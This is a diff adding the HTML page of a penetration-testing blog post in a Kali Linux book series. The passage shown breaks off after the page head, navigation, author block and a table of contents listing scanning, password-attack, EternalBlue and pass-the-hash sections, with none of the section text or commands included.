@@ -1,0 +1,3529 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="false"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  <title>Part 6 All on Networking Penetration Baby &middot; Val&#39;s blog</title>
+    <meta name="title" content="Part 6 All on Networking Penetration Baby &middot; Val&#39;s blog">
+
+  
+  <meta name="description" content="My awesome website">
+  <meta name="keywords" content="Networking,Password-Attacks,">
+  
+  
+  <link rel="canonical" href="http://localhost:1313/posts/ultimate-kali-linux-book/part-6-all-on-networking-penetration-baby/">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.945f40c8e4498d89e2e59609a273bedf35ad7f2f70cc102c004d4deed71a818514c7f7c5bf3c7d1c48d55ae1184dde95e3517d9018b193f874c9f1ce68acbb0e.css"
+    integrity="sha512-lF9AyORJjYni5ZYJonO&#43;3zWtfy9wzBAsAE1N7tcagYUUx/fFvzx9HEjVWuEYTd6V41F9kBixk/h0yfHOaKy7Dg==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.1b8bce45adb10ff1218ae4c256a5b7bddb2880589dcbf6efd974fc2b9de8935c69d164c399db165f44f1ac4fc18e56cf63948ac0c988c06c5e8cf08ca98b174e.js"
+    integrity="sha512-G4vORa2xD/EhiuTCVqW3vdsogFidy/bv2XT8K53ok1xp0WTDmdsWX0TxrE/BjlbPY5SKwMmIwGxejPCMqYsXTg=="></script>
+  
+    
+    
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.90867e4ceecde25580f418994053fd0749d446fd0e8f0028782793ec6434fb0945ecbfe21e6a8b2f788760c0ecc3663aacb155e42e4e73d79ebaebadecd201d2.js"
+      integrity="sha512-kIZ&#43;TO7N4lWA9BiZQFP9B0nURv0OjwAoeCeT7GQ0&#43;wlF7L/iHmqLL3iHYMDsw2Y6rLFV5C5Oc9eeuuut7NIB0g=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.b4b722fcb5d42f34f52b30a92f3521b69f403ca9d96d0d6179eb537cb870f5d83fdf1fe836688d95d5c99fefbda4170487711006e56051fa67ea00da10521721.js" integrity="sha512-tLci/LXULzT1KzCpLzUhtp9APKnZbQ1heetTfLhw9dg/3x/oNmiNldXJn&#43;&#43;9pBcEh3EQBuVgUfpn6gDaEFIXIQ=="></script>
+  
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-6-all-on-networking-penetration-baby/">
+  <meta property="og:site_name" content="Val&#39;s blog">
+  <meta property="og:title" content="Part 6 All on Networking Penetration Baby">
+  <meta property="og:description" content="My awesome website">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-06-11T06:29:21+00:00">
+    <meta property="article:modified_time" content="2024-06-11T06:29:21+00:00">
+    <meta property="article:tag" content="Networking">
+    <meta property="article:tag" content="Password-Attacks">
+      <meta property="og:see_also" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-7-advanced-network-penetration-testing-post-exploitation/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shells/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-4-performing-vulnerability-assessments/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-3-exploring-active-reconnaissance-techniques/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-2-reconnaissance-and-footprint/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/ultimate-kali-linux-book/part-1-buidling-a-penetration-testing-labs/">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Part 6 All on Networking Penetration Baby">
+  <meta name="twitter:description" content="My awesome website">
+
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog",
+    "name": "Part 6 All on Networking Penetration Baby",
+    "headline": "Part 6 All on Networking Penetration Baby",
+    
+    
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/posts\/ultimate-kali-linux-book\/part-6-all-on-networking-penetration-baby\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Valentin B"
+    },
+    "copyrightYear": "2024",
+    "dateCreated": "2024-06-11T06:29:21\u002b00:00",
+    "datePublished": "2024-06-11T06:29:21\u002b00:00",
+    
+    "dateModified": "2024-06-11T06:29:21\u002b00:00",
+    
+    "keywords": ["Networking","Password-Attacks"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "3977"
+  }]
+  </script>
+
+
+
+  
+  
+    <meta name="author" content="Valentin B">
+  
+  
+    
+      
+        
+      
+    
+      
+        
+          <link href="https://github.com/LiLTrash1" rel="me">
+        
+      
+    
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.03cb160e3cfdb2667a2e2c80d283bebcf63ff8bbc4b629c9ab2babf6fae1d0c07ad470edae783efa4fabda2ac01c58d60e63b98b3c336be8208460f08f4354f5.js" integrity="sha512-A8sWDjz9smZ6LiyA0oO&#43;vPY/&#43;LvEtinJqyur9vrh0MB61HDtrng&#43;&#43;k&#43;r2irAHFjWDmO5izwza&#43;gghGDwj0NU9Q=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a
+      >
+    </div>
+    
+    
+      
+
+
+
+
+
+
+
+
+
+
+
+<div
+  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
+  
+  
+    
+    
+      <div>
+        <a href="/" class="flex">
+          <span class="sr-only">Val&rsquo;s blog</span>
+          
+            <img
+              src="/img/big-cat.webp"
+              width="14"
+              height="15"
+              class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom"
+              alt="Val&#39;s blog">
+          
+        </a>
+      </div>
+    
+
+  <div class="flex flex-1 items-center justify-between">
+    <nav class="flex space-x-3">
+      
+        <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">
+          Val&rsquo;s blog
+        </a>
+      
+    </nav>
+    
+  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+    
+      
+        
+  <a
+  href="/posts/"
+  
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Blog">
+    Blog
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/series/"
+  
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Series">
+    Series
+  </p>
+</a>
+
+
+
+      
+    
+
+    
+
+
+    
+      <button
+        id="search-button"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+      </button>
+    
+
+    
+      <div class=" flex items-center">
+        <button
+          id="appearance-switcher"
+          aria-label="Dark mode switcher"
+          type="button"
+          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+          <div class="flex items-center justify-center dark:hidden">
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+          </div>
+          <div class="items-center justify-center hidden dark:flex">
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+          </div>
+        </button>
+      </div>
+    
+  </nav>
+
+    
+  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+    <span></span>
+
+    
+
+    
+      <button
+        id="search-button-mobile"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+      </button>
+    
+
+    
+      <button
+        id="appearance-switcher-mobile"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+        <div class="flex items-center justify-center dark:hidden">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+        </div>
+      </button>
+    
+  </div>
+
+  </div>
+  
+  <div class="-my-2 md:hidden">
+    <div id="menu-button" class="block">
+      
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+        </div>
+        <div
+          id="menu-wrapper"
+          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
+          <ul
+            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+            <li id="menu-close-button">
+              <span
+                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+              </span>
+            </li>
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/posts/"
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Blog">
+      Blog
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/series/"
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Series">
+      Series
+    </p>
+  </a>
+</li>
+
+
+
+            
+
+          </ul>
+          
+        </div>
+      
+    </div>
+  </div>
+
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+
+
+  <article>
+    
+      
+      
+      
+      
+        
+  
+
+      
+    
+
+
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Part 6 All on Networking Penetration Baby
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2024-06-11T06:29:21&#43;00:00">11 Jun, 2024</time><span class="px-2 text-primary-500">&middot;</span><span>3977 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">19 mins</span><span class="px-2 text-primary-500">&middot;</span>
+
+
+  
+    
+  
+  
+
+<span class="mb-[2px]">
+  <a
+    href="#/posts/Ultimate-Kali-Linux-Book/Part-6-All-On-Networking-Penetration-Baby/index.md"
+    class="text-lg hover:text-primary-500"
+    rel="noopener noreferrer"
+    target="_blank"
+    title="Edit content"
+    ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 512 512"><path fill="currentColor" d="M441 58.9L453.1 71c9.4 9.4 9.4 24.6 0 33.9L424 134.1 377.9 88 407 58.9c9.4-9.4 24.6-9.4 33.9 0zM209.8 256.2L344 121.9 390.1 168 255.8 302.2c-2.9 2.9-6.5 5-10.4 6.1l-58.5 16.7 16.7-58.5c1.1-3.9 3.2-7.5 6.1-10.4zM373.1 25L175.8 222.2c-8.7 8.7-15 19.4-18.3 31.1l-28.6 100c-2.4 8.4-.1 17.4 6.1 23.6s15.2 8.5 23.6 6.1l100-28.6c11.8-3.4 22.5-9.7 31.1-18.3L487 138.9c28.1-28.1 28.1-73.7 0-101.8L474.9 25C446.8-3.1 401.2-3.1 373.1 25zM88 64C39.4 64 0 103.4 0 152V424c0 48.6 39.4 88 88 88H360c48.6 0 88-39.4 88-88V312c0-13.3-10.7-24-24-24s-24 10.7-24 24V424c0 22.1-17.9 40-40 40H88c-22.1 0-40-17.9-40-40V152c0-22.1 17.9-40 40-40H200c13.3 0 24-10.7 24-24s-10.7-24-24-24H88z"/></svg>
+  </span>
+
+</span></a
+  >
+</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/categories/walkthrough/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/networking/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Networking
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/password-attacks/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Password-Attacks
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+      
+      
+      
+      
+
+      
+
+      
+
+        
+          
+          
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img
+        class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4"
+        width="96"
+        height="96"
+        alt="Valentin B"
+        src="/img/lain-bear-icon_hu_5e233113a2b044ff.jpg">
+    
+  
+  <div class="place-self-center">
+    
+      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+        Author
+      </div>
+      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+        Valentin B
+      </div>
+    
+    
+      <div class="text-sm text-neutral-700 dark:text-neutral-400">Focusing on mastering penetration testing and digital forensics</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="mailto:valentinbergamotto@gmail.com"
+          target="_blank"
+          aria-label="Email"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/LiLTrash1"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+        
+
+        
+
+        
+          <div class="mb-5"></div>
+        
+
+      
+
+    </header>
+
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+        <div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+          <div
+            class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky 
+              lg:top-10
+            
+            ">
+            
+              <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-discovering-live-systems">1. Discovering live systems</a>
+      <ul>
+        <li><a href="#11-scanning-for-available-devices-using-netdiscover">1.1 Scanning for available devices using Netdiscover</a></li>
+        <li><a href="#12-scanning-for-available-devices-using-nmap">1.2 Scanning for available devices using Nmap</a></li>
+        <li><a href="#13-scanning-for-available-devices-using-nbtscan">1.3 Scanning for available devices using nbtscan</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-profiling-a-target-system">2. Profiling a target system</a>
+      <ul>
+        <li><a href="#21-using-nmap-to-scan-for-os-versions">2.1 Using Nmap to scan for OS versions</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-exploring-password-based-attacks">3. Exploring password-based attacks</a>
+      <ul>
+        <li><a href="#31-using-ncrack-to-guest-passwords-online">3.1 Using Ncrack to guest passwords online</a></li>
+        <li><a href="#32-using-hydra-to-guest-passwords-online">3.2 Using Hydra to guest passwords online</a></li>
+        <li><a href="#33-exploiting-remote-desktop-protocol-rdp">3.3 Exploiting Remote Desktop Protocol (RDP)</a></li>
+        <li><a href="#34-creating-custom-wordlistsdictionary-using-cewl">3.4 Creating custom wordlists/dictionary using CeWl</a></li>
+        <li><a href="#35-creating-custom-wordlistsdictionary-using-crunch">3.5 Creating custom wordlists/dictionary using Crunch</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-identifying-and-exploiting-vulnerable-services">4. Identifying and Exploiting Vulnerable services</a>
+      <ul>
+        <li><a href="#41-anonymous-login-misconfiguration-on-ftp">4.1 Anonymous Login Misconfiguration on FTP</a></li>
+        <li><a href="#42-smb-eternalblue-vulnerability">4.2 SMB Eternalblue vulnerability</a></li>
+        <li><a href="#43-cracking-passwords-with-hashcat">4.3 Cracking Passwords with Hashcat</a></li>
+        <li><a href="#44-getting-a-shell-with-psexec">4.4 Getting a shell with PsExec</a></li>
+        <li><a href="#45-accessing-remote-shares-using-smbclient">4.5 Accessing remote shares using SMBclient</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-passing-the-hash-technique">5 Passing the Hash Technique</a>
+      <ul>
+        <li><a href="#51-getting-that-shell-with-pth-winexe">5.1 Getting that shell with PTH-WinExe</a></li>
+        <li><a href="#52-impacket-the-tool-to-rule-them-all">5.2 Impacket, the tool to rule them all</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-gaining-access-by-exploiting-ssh">6. Gaining Access by Exploiting SSH</a></li>
